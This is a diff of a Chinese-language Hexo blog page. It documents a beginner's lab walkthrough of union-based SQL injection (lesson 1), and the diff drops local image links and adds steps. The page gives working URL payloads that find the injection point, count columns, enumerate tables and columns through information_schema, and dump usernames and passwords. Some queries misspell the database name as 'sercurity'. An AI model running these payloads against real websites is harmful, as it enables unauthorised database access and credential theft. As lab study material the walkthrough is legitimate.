@@ -14,16 +14,11 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="一.寻找sql注入点 根据标题提示该sql注入点为单引号。输入?id&#x3D;1’返回值错误；输入?id&#x3D;1返回值正常。故存在注入点。 注（自己的摸索）：发现输入id&#x3D;非正整数时，页面返回为空。则说明这些返回为合理的错误形式，可利用来掩护sql注入。 二.查询字段数 利用order by语句。?id&#x3D;1%27%20order%20by%20n–+（n为正整数，不断改变n的值通过观察返回状态确定字段数）如：">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="c:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20201114212043135.png">
-<meta property="og:image" content="c:/Users/Lenovo/Desktop/QQ图片20201114221447.png">
-<meta property="og:image" content="c:/Users/Lenovo/Desktop/QQ图片20201114220424.png">
-<meta property="og:image" content="c:/Users/Lenovo/Desktop/QQ图片20201114220840.png">
 <meta property="article:published_time" content="2020-11-14T13:07:05.000Z">
-<meta property="article:modified_time" content="2020-11-14T15:13:23.535Z">
+<meta property="article:modified_time" content="2020-11-16T13:46:41.507Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sql注入基本知识lesson1">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20201114212043135.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -98,20 +93,25 @@
 <p>根据标题提示该sql注入点为单引号。输入?id=1’返回值错误；输入?id=1返回值正常。故存在注入点。</p>
 <p>注（自己的摸索）：发现输入id=非正整数时，页面返回为空。则说明这些返回为合理的错误形式，可利用来掩护sql注入。</p>
 <p>二.查询字段数</p>
-<p>利用order by语句。?id=1%27%20order%20by%20<em>n</em>–+（n为正整数，不断改变n的值通过观察返回状态确定字段数）如：输入?id=1%27%20order%20by%201–+，返回正常，如图：</p>
-<p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20201114212043135.png"></p>
-<p>输入?id=1%27%20order%20by%204–+，返回异常，如图：</p>
-<p><img src="C:\Users\Lenovo\Desktop\QQ图片20201114221447.png"></p>
+<p>利用order by语句。?id=1%27%20order%20by%20<em>n</em>–+（n为正整数，不断改变n的值通过观察返回状态确定字段数）如：</p>
+<p>输入?id=1%27%20order%20by%201–+，返回正常。</p>
+<p>输入?id=1%27%20order%20by%204–+，返回异常。</p>
 <p>当输入到第n-1个正常，第n个不正常时，说明拥有n-1个字段数。</p>
 <p>注：字段数就是sql数据库中存在变量数的个数。</p>
 <p>三.union select看返回值</p>
-<p>1.利用union select语句查看字段数返回值。?id=-1%27union%20select%201,2,3–+。得到如图反馈：<img src="C:\Users\Lenovo\Desktop\QQ图片20201114220424.png"></p>
-<p>由图可以观察到只有2,3代表的回显位能被观察到，即用户从浏览器上反馈看见的只有2,3回显位。</p>
+<p>1.利用union select语句查看字段数返回值。?id=-1%27union%20select%201,2,3–+。</p>
+<p>只有2,3代表的回显位能被观察到，即用户从浏览器上反馈看见的只有2,3回显位。</p>
 <p>2.利用union select语句查看数据库返回值。</p>
-<p>输入?id=-1%27union%20select%201,database(),2–+.得<img src="C:\Users\Lenovo\Desktop\QQ图片20201114220840.png"></p>
+<p>输入?id=-1%27union%20select%201,database(),2–+.</p>
 <p>由此可知：database的名称为security。</p>
 <p>注意使用union select</p>
-<p>四.</p>
+<p>四.查表</p>
+<p>1.输入?id=-1’ union select 1 ,2,group_concat(table_name) from information_schema.tables where table_schema=‘sercurity’–+即可查获在sercurity数据库中的表单名。</p>
+<p>注：对于理解该代码：group_concat(table_name) ：显示该数据库中所有的表名；from information_schema.tables：来自信息图表数据库中的表单。where table_schema=‘sercurity’其中where为限制词，where table_schema=‘sercurity’:寻找范围在数据库名为sercurity中。</p>
+<p>pr:为了方便在页面上看到自己在url里输入的内容可以在index文件里加一句echo “ $sql&lt; br &gt;”;</p>
+<p>五.查字段名以及字段数值</p>
+<p>1.输入?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()–+可查得字段名。</p>
+<p>2.输入?id=-1’union select 1,2,group_concat(username,0x3a,password) from users–+可查得每个用户对应的密码（0x3a是字符冒号‘  ：’对应16进制的ASCLL码）</p>
 
       
     </div>
